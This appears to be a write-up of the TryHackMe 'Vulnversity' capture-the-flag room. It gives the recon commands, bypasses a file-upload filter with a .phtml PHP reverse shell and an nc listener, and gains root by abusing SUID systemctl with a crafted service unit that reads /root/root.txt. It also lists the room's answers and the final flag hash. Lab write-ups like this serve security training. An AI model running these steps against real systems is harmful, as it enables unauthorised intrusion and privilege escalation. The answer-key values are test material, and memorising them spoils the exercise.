Vulnversity-THM

nmap scan gives 6 open ports
sudo nmap -sC -sV 10.10.73.225 -p- --min-rate 5000 -T4 -v -oN nmap.txt

open ports
21
22
139
445
3128
3333

we found an open ssh and ftp ports but we don't have login access

meanwhile, the web server is been served on port 3333. lets navigate to the web server and see what we have
http://10.10.73.225:3333
lokking through the page and the source code, nothing seem interesting except a duden river

lets bruteforce the directory with gobuster and see what we can find
gobuster dir -u http://10.10.73.225:3333 -w=wordlists

found a directory that allows us to upload files
/internal/




Now that you have found a form to upload files, we can leverage this to upload and execute our payload, which will lead to compromising the web server.
Answer the questions below
What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
php

We will fuzz the upload form to identify which extensions are not blocked.

To do this, we're going to use BurpSuite. If you need clarification on what BurpSuite is or how to set it up, please complete our BurpSuite module first.

We're going to use Intruder (used for automating customised attacks).

To begin, make a wordlist with the following extensions:

    .php
    .php3
    .php4
    .php5
    .phtml

Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file; once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.

Click the "Positions" tab now, find the filename and "Add ยง" to the extension. It should look like so:

Run this attack, what extension is allowed?
.phtml

Now that we know what extension we can use for our payload, we can progress.

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and execute your shell, which will beacon out to you to control!

Download the following reverse PHP shell here.
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


To gain remote access to this machine, follow these steps:

    Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).

    Rename this file to php-reverse-shell.phtml

    We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234

    Upload your shell and navigate to http://10.10.73.225:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload

    You should see a connection on your Netcat session

What is the name of the user who manages the webserver?
bill

What is the user flag?



PrivExc

In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password; it will need to write to the shadowers file that you do not have access to, root does; so it has root privileges to make the right changes.


On the system, search for all SUID files. Which file stands out?
find / -user root -perm -4000 -exec ls -ldb {} \;

How to Find SUID Files

By using the following command you can enumerate all binaries having SUID permissions:

find / -perm -u=s -type f 2>/dev/null

    /denotes  start from the top (root) of the file system and find every directory
    -perm denotes search for the permissions that follow
    -u=sdenotes look for files that are owned by the root user
    -typestates the type of file we are looking for
    f denotes a regular file, not the directories or special files
    2 denotes to the second file descriptor of the process, i.e. stderr (standard error)
    > means redirection
    /dev/null is a special filesystem object that throws away everything written into it.


It's challenge time! We have guided you through this far. Can you exploit this system further to escalate your privileges and get the final answer?
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"

Become root and get the last flag (/root/root.txt)
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "whoami > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

a58ff8579f0a9270368d33a9966c7fd5
